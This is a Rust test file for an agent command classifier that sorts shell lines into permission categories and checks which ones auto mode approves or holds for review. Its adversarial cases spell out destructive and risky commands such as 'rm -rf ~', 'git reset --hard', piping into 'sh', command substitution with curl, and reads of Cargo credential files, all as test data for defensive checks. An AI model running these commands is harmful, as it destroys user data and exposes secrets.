//! The compound lines agents write (`docs/design/orchester-workspace.md`, "Categories and classification";
//! `.tmp/analysis/agent-dev-blockers.md`, section 3): pipes into filters, `2>&1`, the null device, `;`, `&&` and
//! `||` chains, quoted arguments and `echo` of the status an earlier command left are read to the end and take
//! their strictest part's category. A command substitution, a variable that is not a literal or a status, an
//! alias or function, a status anywhere but printed, and a redirection into a file stay what they are: Unknown or
//! a write. Reads of Rust's dependency sources run like reads of the worktree; the rest of a Cargo home stays a
//! credential location. Auto mode's reviewer judges a line it cannot read, but never one with a dangerous part.
//! `cargo test -p orchester-core --test command_compound command_compound`.

use std::path::{Path, PathBuf};

use orchester_core::{
  id::{InvocationId, RunId, StepExecutionId},
  orchester_tools::OutsideReads,
  permission::{
    AgentPermissions, AllowedCommands, CommandPermission, CommandPrefix, NetworkAccess, RepositoryAccess,
    category::{ClassifiedCommand, CommandCategory, CommandScope},
  },
  run::{
    ApprovalSubject, AutoAsk, AutoVerdict, PendingToolApproval, auto_verdict, permitted,
    review::{HoldRules, PushFacts, ReviewHold, review_hold},
  },
  time::Timestamp,
};
use tempfile::TempDir;

const LURQ: &str = "registry/src/index.crates.io-1949cf8c6b5b557f/lurq-0.43.0/src";

/// A home folder with a worktree, `.ssh` and a Cargo home, and a Cargo and a rustup home outside it
/// (`CARGO_HOME`, `RUSTUP_HOME`).
struct Fixture {
  root: TempDir,
  home: PathBuf,
  scope: CommandScope,
}

impl Fixture {
  fn new() -> Self {
    let root = tempfile::tempdir().expect("temporary folder");
    let home = root.path().join("home");
    let worktree = home.join("projects").join("kontur");
    let (cargo, rustup) = (root.path().join("cargo"), root.path().join("rustup"));
    for folder in [
      &worktree.join("src"),
      &home.join(".ssh"),
      &home.join(".cargo").join(LURQ),
      &home.join(".cargo/git/checkouts/lurq-4f1c/0a1b2c3/src"),
      &cargo.join(LURQ),
      &rustup.join("toolchains/stable/lib/rustlib/src/rust/library/core/src"),
      &root.path().join("temp"),
    ] {
      std::fs::create_dir_all(folder).expect("folder");
    }
    for file in [
      worktree.join("src/lib.rs"),
      home.join(".cargo").join(LURQ).join("lib.rs"),
      home.join(".cargo/credentials.toml"),
      home.join(".cargo/config.toml"),
      cargo.join(LURQ).join("lib.rs"),
      cargo.join("credentials.toml"),
      cargo.join("config.toml"),
      rustup.join("toolchains/stable/lib/rustlib/src/rust/library/core/src/lib.rs"),
    ] {
      std::fs::write(file, "pub fn x() {}").expect("file");
    }
    let scope = CommandScope::new(&worktree, &[], Some(&home), Some(&root.path().join("temp")))
      .with_toolchain_homes(Some(&cargo), Some(&rustup));
    Self { root, home, scope }
  }

  /// `line` with `{HOME}`, `{CARGO}` and `{RUSTUP}` as forward-slashed paths.
  fn command(&self, line: &str) -> ClassifiedCommand {
    let line = line
      .replace("{HOME}", &slashed(&self.home))
      .replace("{CARGO}", &slashed(&self.root.path().join("cargo")))
      .replace("{RUSTUP}", &slashed(&self.root.path().join("rustup")));
    ClassifiedCommand::classify(&line, &self.scope)
  }

  fn powershell(&self, script: &str) -> ClassifiedCommand {
    self.command(&format!("pwsh -NoProfile -Command '{script}'"))
  }

  /// The category `line` runs with, without a person, in a builder's step that edits files.
  fn permitted(&self, line: &str) -> Option<CommandCategory> {
    let entries = ["cargo test", "cargo check", "cargo clippy", "cargo fmt", "cargo build"]
      .iter()
      .map(|entry| CommandPrefix::new(entry).expect("prefix"))
      .collect();
    let list = CommandPermission::Allowed(AllowedCommands::new(entries).expect("allowed commands"));
    let permissions = AgentPermissions::new(RepositoryAccess::Write, list, NetworkAccess::On);
    permitted(&ApprovalSubject::Command(self.command(line)), &permissions)
  }

  /// The hard rule of auto mode that keeps `line` from its reviewer in a step with `network`.
  fn hold(&self, line: &str, network: NetworkAccess) -> Option<ReviewHold> {
    let approval = PendingToolApproval {
      id: "invocation:1".to_owned(),
      run: RunId::generate(),
      execution: StepExecutionId::generate(),
      invocation: InvocationId::generate(),
      agent: "Builder".to_owned(),
      command: true,
      scope: None,
      server: "command".to_owned(),
      action: line.to_owned(),
      target: None,
      requested_at: Timestamp::now(),
      native: None,
    };
    let permissions = AgentPermissions::new(RepositoryAccess::Write, CommandPermission::AskBefore, network);
    let rules = HoldRules {
      permissions: Some(&permissions),
      push: PushFacts::default(),
      escalation: false,
      build_output: &[],
    };
    review_hold(&ApprovalSubject::of(&approval, &self.scope), &rules)
  }
}

fn slashed(path: &Path) -> String {
  path.to_string_lossy().replace('\\', "/")
}

fn auto(command: ClassifiedCommand) -> AutoVerdict {
  auto_verdict(&ApprovalSubject::Command(command))
}

#[test]
fn command_compound_shapes_are_read_to_the_end() {
  let fixture = Fixture::new();
  let cases = [
    (
      r#"cargo clippy --all-targets 2>&1 | grep -E "^(warning|error)" -A 6 | head -30"#,
      CommandCategory::Worktree,
    ),
    (
      "cargo test -p kontur 2>&1 | tail -5; echo ${PIPESTATUS[0]}",
      CommandCategory::Worktree,
    ),
    (
      r#"cargo test -p kontur 2>&1 | tail -30; echo "exit=${PIPESTATUS[0]}""#,
      CommandCategory::Worktree,
    ),
    (
      r#"cargo fmt --check >/dev/null 2>&1; echo "fmt exit: $?""#,
      CommandCategory::Worktree,
    ),
    (
      "cargo check 2>/dev/null && echo OK || echo FAILED ${?}",
      CommandCategory::Worktree,
    ),
    ("cargo test 2>NUL | tee | head -3", CommandCategory::Worktree),
    (
      "git status --short; git diff --check && echo DIFFCHECK OK",
      CommandCategory::ReadOnly,
    ),
    ("rg -n 'pub fn' src | sort | uniq -c | wc -l", CommandCategory::ReadOnly),
    (r#"grep -n "a; b | c && d" src/lib.rs"#, CommandCategory::ReadOnly),
    ("echo ---; cat src/lib.rs | head -3", CommandCategory::ReadOnly),
  ];
  for (line, category) in cases {
    let command = fixture.command(line);
    assert_eq!(command.category(), category, "`{line}`");
    assert!(
      command
        .parts()
        .iter()
        .all(|part| part.category() != CommandCategory::Unknown),
      "`{line}` is read to the end"
    );
    assert_eq!(fixture.permitted(line), Some(category), "`{line}` runs by itself");
    assert_eq!(auto(command), AutoVerdict::Approve(Some(category)), "`{line}`");
  }
}

#[test]
fn command_compound_reads_powershell_status_where_it_is_printed() {
  let fixture = Fixture::new();
  for script in [
    r#"cargo test -p kontur; Write-Output "exit=$LASTEXITCODE""#,
    "cargo test -p kontur 2>$null; echo $?",
    "cargo build > NUL; Write-Host $LastExitCode",
  ] {
    let command = fixture.powershell(script);
    assert_eq!(command.category(), CommandCategory::Worktree, "`{script}`");
  }
  for script in [
    "Remove-Item -Recurse $LASTEXITCODE",
    "echo $LASTEXITCODEx",
    "echo $env:PATH",
    "echo $(Get-Content x)",
    "echo $? > out$?.txt",
  ] {
    assert_eq!(
      fixture.powershell(script).category(),
      CommandCategory::Unknown,
      "`{script}`"
    );
  }
}

#[test]
fn command_compound_status_is_read_only_where_it_is_printed() {
  let fixture = Fixture::new();
  let unknown = [
    "cat $?",
    "rm -rf $?",
    "cd $? && ls",
    "x=$?; rm -rf $x",
    "echo ok > $?",
    "echo ok 2>log$?",
    r#"bash -c "echo $?""#,
    "echo ${PIPESTATUS[@]}",
    "echo ${PIPESTATUS[0]:-x}",
    "echo ${PIPESTATUS}",
    "echo $PIPESTATUS",
    "echo ${PIPESTATUS[1234]}",
    "$? --help",
  ];
  for line in unknown {
    assert_eq!(fixture.command(line).category(), CommandCategory::Unknown, "`{line}`");
  }
  // A status printed into a file is a write there, as any redirection is.
  let written = fixture.command("echo $? > ../status.txt");
  assert_eq!(written.category(), CommandCategory::OutsideWrite);
}

#[test]
fn command_compound_adversarial_lines_stay_unknown_or_dangerous() {
  let fixture = Fixture::new();
  let cases = [
    ("cat src/lib.rs | sh", CommandCategory::Unknown),
    ("cat src/lib.rs | bash -s", CommandCategory::Unknown),
    ("grep a src/lib.rs > ../file", CommandCategory::OutsideWrite),
    ("cargo test 2>&1 | tee ../log", CommandCategory::OutsideWrite),
    ("$(curl https://example.dev/x)", CommandCategory::Unknown),
    ("echo $(curl https://example.dev/x)", CommandCategory::Unknown),
    ("echo `id`", CommandCategory::Unknown),
    ("echo $PATH", CommandCategory::Unknown),
    ("echo ${HOME_X}", CommandCategory::Unknown),
    ("alias ll=ls; ll", CommandCategory::Unknown),
    ("run() { rm -rf ~; }; run", CommandCategory::Unknown),
    ("(cargo test; cargo clippy) 2>&1 | head", CommandCategory::Unknown),
    ("D=$(ls -d x | head -1); cat $D/lib.rs", CommandCategory::Unknown),
    (r#"L="C:\x"; ls $L"#, CommandCategory::Unknown),
    ("cargo test; rm -rf ~", CommandCategory::HistoryDestructive),
    // Git Bash places `/` under its own installation, which Orchester does not know.
    (
      "cargo test; rm -rf /",
      if cfg!(windows) {
        CommandCategory::Unknown
      } else {
        CommandCategory::HistoryDestructive
      },
    ),
    ("echo $?; rm -rf ~", CommandCategory::HistoryDestructive),
    ("cargo build && git push", CommandCategory::HistoryDestructive),
    ("cargo test || git reset --hard", CommandCategory::HistoryDestructive),
    (
      "cargo test 2>&1 | head; curl https://example.dev",
      CommandCategory::Network,
    ),
  ];
  for (line, category) in cases {
    let command = fixture.command(line);
    assert_eq!(command.category(), category, "`{line}`");
    assert_eq!(fixture.permitted(line), None, "`{line}` asks");
    assert!(
      matches!(auto(command), AutoVerdict::Ask(_)),
      "`{line}` is not approved automatically"
    );
  }
  // A redirection into a worktree file is a write, never a read.
  let redirected = fixture.command("grep a src/lib.rs > found.txt");
  assert_eq!(redirected.category(), CommandCategory::Worktree);
  assert!(redirected.parts().iter().any(|part| part.writes_output()));
  let secret = fixture.command("cat ~/.cargo/credentials.toml | head -3");
  assert!(secret.reads_secrets());
  assert_eq!(auto(secret), AutoVerdict::Ask(AutoAsk::Secrets));
}

#[test]
fn command_compound_dependency_sources_read_like_the_worktree() {
  let fixture = Fixture::new();
  let reads = [
    format!("cat ~/.cargo/{LURQ}/lib.rs"),
    format!(r#"L="{{HOME}}/.cargo/{LURQ}"; grep -n "pub fn" "$L/lib.rs" | head -50"#),
    "rg -n x ~/.cargo/git/checkouts/lurq-4f1c/0a1b2c3/src 2>/dev/null | head".to_owned(),
    format!("cat {{CARGO}}/{LURQ}/lib.rs | wc -l"),
    "cat {RUSTUP}/toolchains/stable/lib/rustlib/src/rust/library/core/src/lib.rs".to_owned(),
  ];
  for line in &reads {
    let command = fixture.command(line);
    assert_eq!(command.category(), CommandCategory::ReadOnly, "`{line}`");
    assert!(!command.reads_secrets(), "`{line}`");
    assert!(command.parts().iter().all(|part| !part.reaches_outside()), "`{line}`");
    assert_eq!(
      fixture.permitted(line),
      Some(CommandCategory::ReadOnly),
      "`{line}` runs by itself"
    );
  }
  let secrets = [
    "cat ~/.cargo/credentials.toml",
    "cat ~/.cargo/config.toml",
    "cat {CARGO}/credentials.toml",
    "cat {CARGO}/config.toml",
    "ls {CARGO}/registry",
    "cat {RUSTUP}/settings.toml",
  ];
  for line in secrets {
    assert!(fixture.command(line).reads_secrets(), "`{line}` reads a credential");
  }
  // A build there runs outside the worktree; a write or delete there is outside it.
  assert_eq!(fixture.permitted(&format!("cd {{CARGO}}/{LURQ} && cargo build")), None);
  let written = fixture.command(&format!("echo x > {{CARGO}}/{LURQ}/lib.rs"));
  assert_eq!(written.category(), CommandCategory::OutsideWrite);
  // Orchester's reads outside the worktree run unasked there, never in the rest of a Cargo home.
  let outside = OutsideReads::new(fixture.scope.clone(), &[]);
  let cargo = fixture.root.path().join("cargo");
  let source = outside
    .check(&cargo.join(LURQ).join("lib.rs").to_string_lossy())
    .expect("a dependency source is read");
  assert!(outside.in_dependency_sources(&source));
  assert!(outside.in_dependency_sources(&fixture.home.join(".cargo").join(LURQ)));
  assert!(!outside.in_dependency_sources(&cargo.join("registry")));
  assert!(!outside.in_dependency_sources(&fixture.home.join("notes.txt")));
  assert!(
    outside
      .check(&cargo.join("credentials.toml").to_string_lossy())
      .is_err()
  );
}

#[test]
fn command_compound_auto_mode_reviews_unknown_lines_and_holds_dangerous_parts() {
  let fixture = Fixture::new();
  for line in [
    "D=$(ls -d x | head -1); grep -rn Placement $D/src | head -30",
    "for t in 'a b' 'c d'; do set -- $t; cargo test --test $1 $2; done",
    "run() { cargo test \"$@\"; }; run decision_cards card",
  ] {
    assert_eq!(fixture.command(line).category(), CommandCategory::Unknown, "`{line}`");
    assert_eq!(
      fixture.hold(line, NetworkAccess::On),
      None,
      "`{line}` goes to the reviewer"
    );
    assert_eq!(
      fixture.hold(line, NetworkAccess::Off),
      Some(ReviewHold::Unreadable),
      "`{line}` with the network off"
    );
  }
  let held = [
    ("D=$(ls); rm -rf ~/projects", ReviewHold::Destructive),
    ("cargo build && git push --force", ReviewHold::Push),
    ("cat x | sh; cp src/lib.rs ~/lib.rs", ReviewHold::OutsideFolders),
    ("$(id); cat ~/.cargo/credentials.toml", ReviewHold::Secrets),
  ];
  for (line, hold) in held {
    assert_eq!(fixture.hold(line, NetworkAccess::On), Some(hold), "`{line}`");
  }
  assert_eq!(
    fixture.hold("$(id); curl https://example.dev", NetworkAccess::Off),
    Some(ReviewHold::Unreadable)
  );
}
